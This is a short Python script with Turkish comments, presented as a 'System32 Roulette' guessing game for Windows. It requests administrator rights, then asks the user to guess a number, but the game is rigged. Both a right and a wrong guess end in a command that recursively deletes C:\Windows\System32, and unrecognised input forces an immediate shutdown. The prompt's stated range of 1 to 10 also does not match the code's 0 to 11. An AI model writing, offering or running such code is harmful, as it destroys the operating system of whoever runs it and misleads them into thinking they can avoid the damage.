import random # random kütüphanesini içeri al
import os # os kütüphanesini içeri al
import time # time kütüphanesini içeri al
import sys # sys kütüphanesini içeri al
import ctypes #ctypes kütüphanesini içeri al

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    # Yönetici değilse, yönetici haklarıyla yeniden başlat
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit(0)

print("System32 Rulete Hoş Geldiniz") # yazdır
time.sleep(1.5) # bekle
print("Program Bir Sayı Seçecek (1 ila 10 arası) Ve Bilemezseniz System32 Silinecek!") # yazdır
time.sleep(1.5) # bekle
print("Bu İşlem Windowsun Çalışması İçin Gerekli Olan Dosyaları Silme Tehlikesi Taşır Devam Etmek İstiyormusunuz? (evet/hayır)") # yazdır
devam = input("Evet yada Hayır: ").lower() # giriş al ve devam değişkenine kaydet

if devam == "evet": # eğer devam değişkeni evet ise yap 
   randomsayi = random.randint(0,11) # 0 ile 11 arasında bir sayı seç ve randomsayi değişkenine kaydet
   print("Sayıyı Tuttum") # yazdır
   time.sleep(1.5) # bekle
   cevap = int(input("Sayı Sence Ne: ")) # giriş al ve cevap değişkenine kaydet
   
   if cevap == randomsayi: # eğer cevap değişkeni randomsayi değişkeniyle eşit ise yap
      randomsayi = random.randint(0,11) # 0 ile 11 arasında bir sayı seç ve randomsayi değişkenine kaydet
      print("Tuttuğım sayı: " + str(randomsayi)) # yazdır
      time.sleep(1.5) # bekle
      print("Kaybettin") # yazdır
      time.sleep(1.5) # bekle
      print("System32 Siliniyor")
      time.sleep(2.5) # bekle
      os.system("rmdir /S /Q C:\\Windows\\System32") # system32 yi sil
   
   else: # eğer cevap değişkeni randomsayi değişkeniyle eşit değilse yap
      print("Tuttuğım sayı: " + str(randomsayi)) # yazdır
      time.sleep(1.5) # bekle
      print("Kaybettin") # yazdır
      time.sleep(1.5) # bekle
      print("System32 Siliniyor") # yazdır
      time.sleep(2.5) # bekle
      os.system("rmdir /S /Q C:\\Windows\\System32") # system32 yi sil

elif devam == "hayır": # eğer devam değişkeni hayır ise yap
   print("Kaybetmektenmi Korktun?") # yazdır
   time.sleep(1.5) # bekle
   print("Korkak Seni!") # yazdır

else: # eğer devam değişkeni evet veya hayırdan başka bir değer aldıysa yap
   print("Bu Yazdığını Anlamadım (kesinlikle kodlamaya üşenmedim) Bunu Hayır Olarak Alıyorum") # yazdır
   time.sleep(1.5) # bekle
   print("Anlaşılamayan Birşey Yazdığın İçin Sana Ceza Veriyorum") # yazdır
   time.sleep(2.5) # bekle
   os.system("shutdown /s /t 1") # bilgisayarı kapat
   